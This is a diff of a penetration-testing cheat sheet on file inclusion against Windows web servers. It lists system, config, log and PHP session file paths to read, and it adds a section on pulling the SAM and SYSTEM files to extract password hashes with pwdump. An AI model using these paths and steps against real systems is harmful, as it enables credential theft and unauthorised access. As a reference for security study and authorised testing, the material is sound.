@@ -242,40 +242,69 @@ We can also inject code into /proc/self/environ through the user-agent
 
 ## Windows
 
-* Fingerprinting
+**Fingerprinting**
 
-  _:\boot.ini  
-    _:\WINDOWS\win.ini  
-    _:\WINNT\win.ini  
-    _:\WINDOWS\Repair\SAM  
-    _:\WINDOWS\php.ini  
-    _:\WINNT\php.ini  
-    _:\Program Files\Apache Group\Apache\conf\httpd.conf  
-    _:\Program Files\Apache Group\Apache2\conf\httpd.conf  
-    _:\Program Files\xampp\apache\conf\httpd.conf  
-    _:\php\php.ini  
-    _:\php5\php.ini  
-    _:\php4\php.ini  
-    _:\apache\php\php.ini  
-    _:\xampp\apache\bin\php.ini  
-    _:\home2\bin\stable\apache\php.ini  
-    _:\home\bin\stable\apache\php.ini
+```
+c:\WINDOWS\system32\eula.txt
+c:\boot.ini  
+c:\WINDOWS\win.ini  
+c:\WINNT\win.ini  
+c:\WINDOWS\Repair\SAM  
+c:\WINDOWS\php.ini  
+c:\WINNT\php.ini  
+c:\Program Files\Apache Group\Apache\conf\httpd.conf  
+c:\Program Files\Apache Group\Apache2\conf\httpd.conf  
+c:\Program Files\xampp\apache\conf\httpd.conf  
+c:\php\php.ini  
+c:\php5\php.ini  
+c:\php4\php.ini  
+c:\apache\php\php.ini  
+c:\xampp\apache\bin\php.ini  
+c:\home2\bin\stable\apache\php.ini  
+c:\home\bin\stable\apache\php.ini
+```
 
-* Logs
+**Logs**
+```
+c:\Program Files\Apache Group\Apache\logs\access.log  
+c:\Program Files\Apache Group\Apache\logs\error.log
+```
 
-  _:\Program Files\Apache Group\Apache\logs\access.log  
-    _:\Program Files\Apache Group\Apache\logs\error.log
+**PHP Session Locations**
 
-* PHP Session Locations
+```
+c:\WINDOWS\TEMP\  
+c:\php\sessions\  
+c:\php5\sessions\  
+c:\php4\sessions\
+```
 
-  _:\WINDOWS\TEMP\  
-    _:\php\sessions\  
-    _:\php5\sessions\  
-    _:\php4\sessions\
+**Retrieving password hashes**
 
+In order to retrieve the systems password hashed we need two files: **system** and **SAM**. Once you have those two files you can extract the hased using the kali tool pwdump, like this:
+
+```
+pwdump systemfile samfile
+```
+
+The system and SAM files can be found in different locations, so try them all. From a webserver the path might be case-sensitive, even though it is windows. So consider that!
+
+```
+Systemroot is usually windows
+windows\repair\SAM
+%SYSTEMROOT%\repair\SAM
+%SYSTEMROOT%\System32\config\RegBack\SAM
+%SYSTEMROOT%\System32\config\SAM
+
+
+%SYSTEMROOT%\repair\system
+%SYSTEMROOT%\System32\config\SYSTEM
+%SYSTEMROOT%\System32\config\RegBack\system
+```
 
 ## References:
 
 [https://nets.ec/File\_Inclusion](https://nets.ec/File_Inclusion)  
+
 [https://gist.github.com/sckalath/da1a232f362a700ab459](https://gist.github.com/sckalath/da1a232f362a700ab459)
 
